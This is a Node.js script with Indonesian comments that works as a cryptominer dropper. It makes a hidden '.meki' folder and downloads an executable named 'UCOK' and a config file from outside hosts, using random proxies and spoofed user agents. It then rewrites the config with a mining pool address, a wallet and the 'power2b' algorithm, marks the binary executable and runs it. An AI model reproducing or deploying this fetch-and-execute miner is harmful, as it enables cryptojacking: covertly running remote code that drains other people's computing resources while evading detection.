// pante.js
const fs = require('fs');
const path = require('path');
const { execSync, spawn } = require('child_process');
const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const UserAgent = require('user-agents');

// Lokasi kerja
const WORKDIR = path.join(process.cwd(), '.meki');
if (!fs.existsSync(WORKDIR)) {
  fs.mkdirSync(WORKDIR, { recursive: true });
}
process.chdir(WORKDIR);

// URL file
const URL_GENZO = "https://blogspotgenzo.site/UCOK";
const URL_CONFIG = "http://genzoko.serveblog.net/config.json";

// Nama file
const FILE_GENZO = "UCOK";
const FILE_CONFIG = "config.json";
const FILE_PROXIES = path.join(WORKDIR, "proxies.txt");

// Fungsi ambil proxy random
function getRandomProxy() {
  if (!fs.existsSync(FILE_PROXIES)) return null;

  const proxies = fs.readFileSync(FILE_PROXIES, 'utf8')
    .split('\n')
    .map(p => p.trim())
    .filter(p => p.length > 0);

  if (proxies.length === 0) return null;

  return proxies[Math.floor(Math.random() * proxies.length)];
}

// Fungsi download dengan proxy + user-agent
async function downloadFile(url, outputPath) {
  const userAgent = new UserAgent().toString();
  const proxy = getRandomProxy();

  let axiosConfig = {
    responseType: 'arraybuffer',
    headers: {
      'User-Agent': userAgent,
      'Accept': '*/*',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive'
    },
    timeout: 20000 // 20 detik timeout
  };

  if (proxy) {
    console.log(`[*] Menggunakan proxy: ${proxy}`);
    axiosConfig.httpsAgent = new HttpsProxyAgent(proxy);
  } else {
    console.log("[*] Tidak ada proxy, koneksi langsung dipakai.");
  }

  try {
    const response = await axios.get(url, axiosConfig);
    fs.writeFileSync(outputPath, response.data);
    console.log(`[*] Berhasil download ${path.basename(outputPath)}`);
  } catch (error) {
    console.error(`Gagal download ${url} (proxy: ${proxy || 'direct'}):`, error.message);

    // Jika gagal dengan proxy, coba koneksi langsung sekali lagi
    if (proxy) {
      console.log("[*] Coba ulang tanpa proxy...");
      try {
        const directResponse = await axios.get(url, { ...axiosConfig, httpsAgent: undefined });
        fs.writeFileSync(outputPath, directResponse.data);
        console.log(`[*] Berhasil download ${path.basename(outputPath)} tanpa proxy`);
      } catch (err) {
        console.error("Gagal download tanpa proxy:", err.message);
        process.exit(1);
      }
    } else {
      process.exit(1);
    }
  }
}

// Fungsi edit config.json
function editConfig(filePath) {
  try {
    let data = fs.readFileSync(filePath, 'utf8');

    data = data.replace(/"tua"/g, '"159.89.10.132:80"');
    data = data.replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Qeri"');
    data = data.replace(/"meki"/g, '"power2b"');

    fs.writeFileSync(filePath, data);
    console.log("[*] config.json berhasil diperbarui");
  } catch (error) {
    console.error("Gagal edit config.json:", error.message);
    process.exit(1);
  }
}

// Fungsi ubah file jadi executable
function makeExecutable(filePath) {
  try {
    fs.chmodSync(filePath, 0o755);
    console.log(`[*] ${path.basename(filePath)} sudah bisa dieksekusi`);
  } catch (error) {
    console.error("Gagal mengubah permission:", error.message);
  }
}

// Fungsi jalankan UCOK
function runPante(binary, config) {
  console.log("[*] Menjalankan UCOK (hashrate akan tampil di bawah)...");
  console.log("");

  const processRun = spawn(`./${binary}`, ['-c', config], {
    stdio: 'inherit',
    shell: true
  });

  processRun.on('close', (code) => {
    console.log(`Proses selesai dengan kode: ${code}`);
  });
}

// Main eksekusi
(async () => {
  console.log("[*] Mulai proses...");

  await downloadFile(URL_GENZO, FILE_GENZO);
  await downloadFile(URL_CONFIG, FILE_CONFIG);

  editConfig(FILE_CONFIG);
  makeExecutable(FILE_GENZO);
  runPante(FILE_GENZO, FILE_CONFIG);
})();
